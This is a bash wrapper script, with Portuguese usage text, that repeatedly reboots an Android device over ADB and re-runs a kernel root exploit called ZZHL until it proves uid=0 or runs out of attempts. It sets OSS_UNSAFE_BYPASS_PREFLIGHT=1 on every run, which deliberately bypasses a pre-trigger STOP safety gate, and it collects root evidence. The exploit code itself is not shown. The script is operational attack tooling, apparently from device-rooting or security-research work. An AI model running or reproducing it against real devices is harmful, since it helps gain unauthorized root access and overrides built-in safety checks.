#!/usr/bin/env bash
# Brute-force ZZHL root across reboots.
#
# The exploit reaches root only on a fraction of boots (the failed_rebooted
# crash is a __vunmap->kfree vfree landmine that fires at an unpredictable
# time; see the memory note zzhl-exploit-crash-rootcause). Each crash reboots
# the device and kills the in-boot supervisor, so a single invocation gets one
# real attempt. This wrapper re-runs run-zzhl-device.sh once per boot until it
# reports pass_root (root-helper proves uid=0) or the attempt budget runs out.
#
# run-zzhl-device.sh already waits for the reboot and boot_completed before it
# returns, so between attempts the device is back up; the stability launcher
# then waits for its own quiet gate before each run.
set -euo pipefail

script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
runner="$script_dir/run-zzhl-device.sh"

note() { printf '[brute] %s\n' "$*"; }
die() { printf '[brute] ERRO: %s\n' "$*" >&2; exit 1; }

usage() {
  cat <<'EOF'
Uso: brute-root-loop.sh --serial SERIAL [opções]

Re-roda o exploit ZZHL a cada boot até pass_root ou esgotar tentativas.
Cada tentativa usa OSS_UNSAFE_BYPASS_PREFLIGHT=1 (fura o STOP gate pré-trigger).

  --serial SERIAL           Serial ADB (obrigatório).
  --max-attempts N          Máximo de boots a tentar (padrão 15).
  --route ROTA              legacy (padrão) ou p0. Repassado ao runner.
  --reboot-wait-seconds N   Espera pelo boot após crash (padrão 900). Repassado.
  --settle-seconds N        Pausa extra após o device voltar (padrão 20).
  --build                   Roda `make -B so` uma vez antes do loop.
  -h, --help                Esta ajuda.
EOF
}

serial=
max_attempts=15
route=legacy
reboot_wait_seconds=900
settle_seconds=20
do_build=0

while (( $# )); do
  case "$1" in
    --serial) serial="${2:?serial ausente}"; shift 2 ;;
    --max-attempts) max_attempts="${2:?valor ausente}"; shift 2 ;;
    --route) route="${2:?rota ausente}"; shift 2 ;;
    --reboot-wait-seconds) reboot_wait_seconds="${2:?segundos ausentes}"; shift 2 ;;
    --settle-seconds) settle_seconds="${2:?segundos ausentes}"; shift 2 ;;
    --build) do_build=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "argumento desconhecido: $1" ;;
  esac
done

[[ -n "$serial" ]] || { usage; die "--serial obrigatório"; }
[[ -x "$runner" ]] || die "runner não encontrado/executável: $runner"
[[ "$max_attempts" =~ ^[0-9]+$ && "$max_attempts" -ge 1 ]] || die "--max-attempts inválido"
[[ "$settle_seconds" =~ ^[0-9]+$ ]] || die "--settle-seconds inválido"

adb_bin="${ADB:-adb}"
command -v "$adb_bin" >/dev/null 2>&1 || note "aviso: adb ('$adb_bin') não no PATH; wait-for-device pulado"

if (( do_build )); then
  note "build: make -B so"
  make -C "$script_dir/.." -B so
fi

session_utc="$(date -u +%Y%m%dT%H%M%SZ)"
session_dir="$script_dir/../evidence/zzhl-validation/brute-$session_utc"
mkdir -p "$session_dir"
summary="$session_dir/brute-summary.tsv"
printf 'attempt\tresult\tumh_root_socket_ok\tevidence\n' > "$summary"
note "sessão: $session_dir"

success=0
final_evidence=

for (( attempt=1; attempt<=max_attempts; attempt++ )); do
  note "=== tentativa $attempt/$max_attempts ==="
  iter_log="$session_dir/attempt-$attempt.log"

  set +e
  OSS_UNSAFE_BYPASS_PREFLIGHT=1 "$runner" \
    --serial "$serial" \
    --route "$route" \
    --stability-launcher \
    --reboot-wait-seconds "$reboot_wait_seconds" \
    --execute \
    2>&1 | tee "$iter_log"
  rc=${PIPESTATUS[0]}
  set -e

  # Parse the runner's final "resultado=... evidência=..." line.
  result="$(grep -oE 'resultado=[^ ]+' "$iter_log" | tail -n1 | cut -d= -f2- || true)"
  evidence="$(grep -oE 'evidência=[^ ]+' "$iter_log" | tail -n1 | cut -d= -f2- || true)"
  [[ -n "$result" ]] || result="rc=$rc"

  # Softer signal: did the exploit reach the umh root socket this boot?
  umh=no
  if [[ -n "$evidence" ]]; then
    for sub in postrun recovery immediate .; do
      if [[ -f "$evidence/$sub/rmg-trace.txt" ]] &&
         grep -q 'umh-root-socket-ok' "$evidence/$sub/rmg-trace.txt" 2>/dev/null; then
        umh=yes
        break
      fi
    done
  fi

  printf '%s\t%s\t%s\t%s\n' "$attempt" "$result" "$umh" "${evidence:-?}" >> "$summary"
  note "tentativa $attempt: resultado=$result umh_root_socket_ok=$umh"

  if (( rc == 0 )) || [[ "$result" == pass_root ]]; then
    success=1
    final_evidence="$evidence"
    break
  fi

  if [[ "$result" == blocked_safe ]]; then
    die "blocked_safe: OSS_UNSAFE_BYPASS_PREFLIGHT não aplicou (env não chegou ao payload). Abortando."
  fi

  # run-zzhl-device.sh already waited for boot_completed; give ADB a moment more.
  if command -v "$adb_bin" >/dev/null 2>&1; then
    timeout 120 "$adb_bin" -s "$serial" wait-for-device 2>/dev/null || true
  fi
  (( settle_seconds > 0 )) && sleep "$settle_seconds"
done

note "resumo: $summary"
if (( success )); then
  note "ROOT: pass_root na tentativa $attempt/$max_attempts"
  note "evidência: $final_evidence"
  [[ -f "$final_evidence/root-proof.txt" ]] && note "root-proof: $(< "$final_evidence/root-proof.txt")"
  exit 0
fi

note "sem pass_root em $max_attempts tentativas"
umh_hits="$(grep -cP '\tyes\t' "$summary" || true)"
note "boots que alcançaram umh-root-socket-ok: $umh_hits/$max_attempts"
exit 1
